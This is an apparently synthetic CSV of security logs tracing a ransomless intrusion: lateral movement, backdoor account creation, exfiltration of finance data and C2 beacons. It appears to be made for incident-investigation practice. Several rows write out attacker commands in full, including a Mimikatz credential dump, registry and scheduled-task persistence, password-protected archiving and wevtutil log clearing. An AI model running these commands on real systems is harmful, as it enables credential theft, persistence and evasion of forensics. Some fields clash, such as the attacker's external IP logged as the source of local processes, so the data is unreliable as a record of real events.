timestamp,log_source,event_id,event_type,hostname,source_ip,destination_ip,source_port,destination_port,protocol,username,process_name,command_line,status,bytes_sent,bytes_received,description
2026-05-12 01:18:10,Firewall,,,FW-01,192.168.1.25,192.168.1.35,49211,445,TCP,,,,,,,Lateral movement: SMB connection to internal host 192.168.1.35
2026-05-12 01:18:15,Windows-Security,4624,Successful Login,WS-FIN-02,192.168.1.25,,49211,445,TCP,finance-admin,,,SUCCESS,,,Lateral movement login to Finance workstation
2026-05-12 01:18:19,Firewall,,,FW-01,192.168.1.25,192.168.1.45,49215,445,TCP,,,,,,,Lateral movement: SMB connection to internal host 192.168.1.45
2026-05-12 01:18:22,Windows-Security,4624,Successful Login,WS-FIN-05,192.168.1.25,,49215,445,TCP,finance-admin,,,SUCCESS,,,Lateral movement login
2026-05-12 01:18:28,Firewall,,,FW-01,192.168.1.25,192.168.1.60,49220,445,TCP,,,,,,,Lateral movement: SMB connection to internal host 192.168.1.60
2026-05-12 01:18:33,Windows-Security,4624,Successful Login,SRV-FILE-01,192.168.1.25,,49220,445,TCP,finance-admin,,,SUCCESS,,,Lateral movement to FILE SERVER - HIGH SEVERITY
2026-05-12 01:18:40,Firewall,,,FW-01,192.168.1.25,192.168.1.75,49225,3389,TCP,,,,,,,Lateral movement: RDP connection to internal host 192.168.1.75
2026-05-12 01:18:45,Windows-Security,4624,Successful Login,WS-MGR-02,192.168.1.25,,49225,3389,TCP,finance-admin,,,SUCCESS,,,Lateral movement to Manager workstation
2026-05-12 01:18:50,IDS,,,IDS-01,192.168.1.25,192.168.1.0/24,,,TCP,,,,,,,ALERT: Internal host scanning multiple SMB targets - lateral movement suspected
2026-05-12 01:19:05,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,powershell.exe,powershell.exe -c "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'",SUCCESS,,,CRITICAL: Credential dumping tool executed
2026-05-12 01:19:08,Antivirus,,,WS-FIN-04,185.220.101.12,,,,,finance-admin,powershell.exe,,ALERT,,,CRITICAL: Mimikatz credential dumping detected - process blocked
2026-05-12 01:19:10,Windows-Security,4720,User Account Created,DC-01,192.168.1.25,,,,TCP,finance-admin,,,SUCCESS,,,New account created: svc_backup2
2026-05-12 01:19:15,Windows-Security,4732,Member Added to Group,DC-01,192.168.1.25,,,,TCP,finance-admin,,,SUCCESS,,,svc_backup2 added to Administrators group - PERSISTENCE
2026-05-12 01:19:20,ActiveDirectory,4720,User Account Created,DC-01,192.168.1.25,,,,TCP,finance-admin,,,SUCCESS,,,LDAP WRITE: CN=svc_backup2 created in OU=Service Accounts
2026-05-12 01:19:25,ActiveDirectory,4732,Group Modified,DC-01,192.168.1.25,,,,TCP,finance-admin,,,SUCCESS,,,LDAP WRITE: svc_backup2 added to CN=Administrators group
2026-05-12 01:19:30,Windows-Security,4624,Successful Login,WS-FIN-04,192.168.1.25,,49230,3389,TCP,svc_backup2,,,SUCCESS,,,New backdoor account logged in immediately after creation
2026-05-12 01:19:35,Windows-Security,4672,Special Privileges Assigned,WS-FIN-04,192.168.1.25,,,,TCP,svc_backup2,,,SUCCESS,,,Admin privileges assigned to new backdoor account
2026-05-12 01:20:00,ActiveDirectory,4624,Kerberos Auth,DC-01,192.168.1.25,,,,TCP,svc_backup2,,,SUCCESS,,,Kerberos ticket granted for backdoor account svc_backup2
2026-05-12 01:20:10,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,reg.exe,"reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\Temp\update.exe",SUCCESS,,,Registry persistence key added
2026-05-12 01:20:15,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,schtasks.exe,"schtasks.exe /create /tn SystemUpdate /tr C:\Windows\Temp\update.exe /sc onlogon /ru SYSTEM",SUCCESS,,,Scheduled task created for persistence
2026-05-12 01:20:22,Windows-Security,4688,Process Created,SRV-FILE-01,192.168.1.25,,,,TCP,finance-admin,cmd.exe,cmd.exe /c dir \\SRV-FILE-01\Finance /s /b > C:\Temp\filelist.txt,SUCCESS,,,File server enumeration from lateral movement
2026-05-12 01:20:30,Windows-Security,4688,Process Created,SRV-FILE-01,192.168.1.25,,,,TCP,finance-admin,cmd.exe,cmd.exe /c copy \\SRV-FILE-01\Finance\Q1_Reports C:\Temp\,SUCCESS,,,Copying finance data to staging directory
2026-05-12 01:20:45,Windows-Security,4688,Process Created,SRV-FILE-01,192.168.1.25,,,,TCP,finance-admin,cmd.exe,cmd.exe /c copy \\SRV-FILE-01\Finance\Q2_Reports C:\Temp\,SUCCESS,,,Copying finance data to staging directory
2026-05-12 01:21:00,Windows-Security,4688,Process Created,SRV-FILE-01,192.168.1.25,,,,TCP,finance-admin,cmd.exe,cmd.exe /c copy \\SRV-FILE-01\Finance\Payroll_2026 C:\Temp\,SUCCESS,,,CRITICAL: Payroll data being staged for exfiltration
2026-05-12 01:21:10,Windows-Security,4688,Process Created,SRV-FILE-01,192.168.1.25,,,,TCP,finance-admin,cmd.exe,cmd.exe /c copy \\SRV-FILE-01\Finance\BankDetails C:\Temp\,SUCCESS,,,CRITICAL: Bank details being staged for exfiltration
2026-05-12 01:21:20,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,cmd.exe,cmd.exe /c copy \\SRV-FILE-01\Finance\ExecutiveReports C:\Temp\,SUCCESS,,,Executive reports staged for exfiltration
2026-05-12 01:21:44,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,rar.exe,"rar.exe a -hp -r C:\Windows\Temp\archive.rar C:\Temp\*.*",SUCCESS,,,Data archiving with password protection before exfil
2026-05-12 01:21:44,Antivirus,,,WS-FIN-04,185.220.101.12,,,,,finance-admin,rar.exe,,ALERT,,,CRITICAL: Sensitive data archiving detected - Finance folder targeted
2026-05-12 01:21:48,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: 45.77.22.91.nip.io resolved 45.77.22.91
2026-05-12 01:21:49,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - SUSPICIOUS domain masquerading as Microsoft
2026-05-12 01:21:50,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49301,443,TCP,,,,,847204312,,CRITICAL: Large data upload to external IP 45.77.22.91 - possible exfiltration
2026-05-12 01:21:55,Antivirus,,,WS-FIN-04,192.168.1.25,45.77.22.91,,,TCP,finance-admin,,,ALERT,,,CRITICAL: Large outbound data transfer detected 847MB to unknown external host
2026-05-12 01:22:10,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49302,443,TCP,,,,,524100008,,CRITICAL: Second large upload to 45.77.22.91 - exfiltration continuing
2026-05-12 01:22:30,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49303,443,TCP,,,,,312000000,,CRITICAL: Third data upload to attacker server 45.77.22.91
2026-05-12 01:22:50,IDS,,,IDS-01,192.168.1.25,45.77.22.91,49301,443,TCP,,,,,,,ALERT: Data exfiltration signature matched - total volume exceeds 1.5GB threshold
2026-05-12 01:23:00,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,cmd.exe,cmd.exe /c del /f /q C:\Temp\*.* && del /f /q C:\Windows\Temp\archive.rar,SUCCESS,,,Attacker deleting staging files to cover tracks
2026-05-12 01:23:10,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,cmd.exe,cmd.exe /c wevtutil cl Security,SUCCESS,,,CRITICAL: Windows Security event log cleared by attacker
2026-05-12 01:23:15,Windows-Security,4688,Process Created,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,cmd.exe,cmd.exe /c wevtutil cl System,SUCCESS,,,CRITICAL: Windows System event log cleared by attacker
2026-05-12 01:23:20,Windows-Security,1102,Audit Log Cleared,WS-FIN-04,185.220.101.12,,,,TCP,finance-admin,,,SUCCESS,,,Security audit log was cleared - anti-forensics
2026-05-12 01:24:10,Windows-Security,4634,Logoff,WS-FIN-04,185.220.101.12,,54821,3389,TCP,finance-admin,,,SUCCESS,,,Attacker disconnected RDP session
2026-05-12 01:24:30,Firewall,,,FW-01,185.220.101.12,192.168.1.25,55001,3389,TCP,,,,,,,BLOCK: RDP connection attempt blocked - RDP-Limit-Exceeded rule triggered
2026-05-12 01:25:00,IDS,,,IDS-01,185.220.101.12,192.168.1.25,,,TCP,,,,,,,ALERT: Brute force pattern detected from 185.220.101.12 - 10 failures before success
2026-05-12 01:25:10,IDS,,,IDS-01,192.168.1.25,45.77.22.91,,,TCP,,,,,,,ALERT: Exfiltration confirmed - 1.6GB transferred to threat actor IP 45.77.22.91
2026-05-12 01:30:00,Windows-Security,4624,Successful Login,WS-FIN-04,192.168.1.25,,49400,3389,TCP,svc_backup2,,,SUCCESS,,,Backdoor account svc_backup2 still active after attacker left
2026-05-12 01:35:00,Windows-Security,4624,Successful Login,WS-IT-03,192.168.1.25,,49410,445,TCP,svc_backup2,,,SUCCESS,,,Backdoor account accessing IT systems
2026-05-12 01:40:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 01:40:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49500,443,TCP,,,,,1024,,C2 beacon - small periodic callback to attacker server
2026-05-12 01:55:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 01:55:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49510,443,TCP,,,,,1024,,C2 beacon continuing every 15 minutes
2026-05-12 02:10:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 02:10:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49520,443,TCP,,,,,1024,,C2 beacon
2026-05-12 02:25:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 02:25:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49530,443,TCP,,,,,1024,,C2 beacon
2026-05-12 02:40:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 02:40:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49540,443,TCP,,,,,1024,,C2 beacon
2026-05-12 02:55:00,DNS,,,DNS-01,192.168.1.25,,,53,UDP,,,,,,,DNS query: update.microsoft-cdn.net resolved 45.77.22.91 - C2 beacon
2026-05-12 02:55:05,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49550,443,TCP,,,,,1024,,C2 beacon
2026-05-12 03:10:00,Windows-Security,4624,Successful Login,WS-FIN-04,192.168.1.25,,49600,3389,TCP,svc_backup2,,,SUCCESS,,,Backdoor account active - 2 hours after initial attack
2026-05-12 03:30:00,Windows-Security,4688,Process Created,WS-FIN-04,192.168.1.25,,,,TCP,svc_backup2,powershell.exe,powershell.exe -enc TgBlAHcALQBPAGIAagBlAGMAdAA=,SUCCESS,,,Backdoor account running encoded commands
2026-05-12 04:00:00,Windows-Security,4624,Successful Login,WS-FIN-04,192.168.1.25,,49700,3389,TCP,svc_backup2,,,SUCCESS,,,Backdoor account still active 3hrs after attack
2026-05-12 06:00:05,Windows-Security,4624,Successful Login,WS-FIN-04,10.10.1.5,,49800,445,TCP,john.adeyemi,,,SUCCESS,,,Legitimate user john.adeyemi logs in for work day
2026-05-12 06:01:10,Windows-Security,4688,Process Created,WS-FIN-04,10.10.1.5,,,,TCP,john.adeyemi,EXCEL.EXE,EXCEL.EXE C:\Finance\Budget_2026.xlsx,FAILURE,,,File not found - attacker deleted files
2026-05-12 06:02:00,Windows-Security,4688,Process Created,WS-FIN-04,10.10.1.5,,,,TCP,john.adeyemi,explorer.exe,explorer.exe C:\Finance\Q1_Reports,FAILURE,,,Directory empty - data was stolen
2026-05-12 06:03:30,Windows-Security,4624,Successful Login,WS-HR-01,10.10.1.8,,49810,445,TCP,amina.bello,,,SUCCESS,,,Normal morning login HR user
2026-05-12 06:05:00,Windows-Security,4624,Successful Login,WS-ACCT-03,10.10.1.20,,49820,445,TCP,tunde.fashola,,,SUCCESS,,,Normal morning login
2026-05-12 06:07:00,Windows-Security,4688,Process Created,WS-FIN-04,10.10.1.5,,,,TCP,john.adeyemi,OUTLOOK.EXE,OUTLOOK.EXE,SUCCESS,,,User opens Outlook to report missing files
2026-05-12 06:10:00,Windows-Security,4624,Successful Login,WS-MGR-01,10.10.1.33,,49830,445,TCP,ngozi.eze,,,SUCCESS,,,Manager logs in for work day
2026-05-12 06:15:00,Windows-Security,4624,Successful Login,WS-IT-02,10.10.1.12,,49840,445,TCP,chidi.okonkwo,,,SUCCESS,,,IT admin logs in
2026-05-12 06:20:00,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49560,443,TCP,,,,,1024,,C2 beacon still running during business hours
2026-05-12 06:35:00,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49570,443,TCP,,,,,1024,,C2 beacon
2026-05-12 06:50:00,Firewall,,,FW-01,192.168.1.25,45.77.22.91,49580,443,TCP,,,,,1024,,C2 beacon
2026-05-12 07:05:00,Windows-Security,4624,Successful Login,WS-FIN-04,192.168.1.25,,49900,3389,TCP,svc_backup2,,,SUCCESS,,,Backdoor account still active 6hrs after attack - not yet detected
2026-05-12 07:30:00,IDS,,,IDS-01,192.168.1.25,45.77.22.91,,,TCP,,,,,,,ALERT: Recurring C2 beacon pattern detected - 15 minute intervals to 45.77.22.91
2026-05-12 07:35:00,IDS,,,IDS-01,192.168.1.25,45.77.22.91,,,TCP,,,,,,,ALERT: Threat intelligence match - 45.77.22.91 listed on abuse.ch blocklist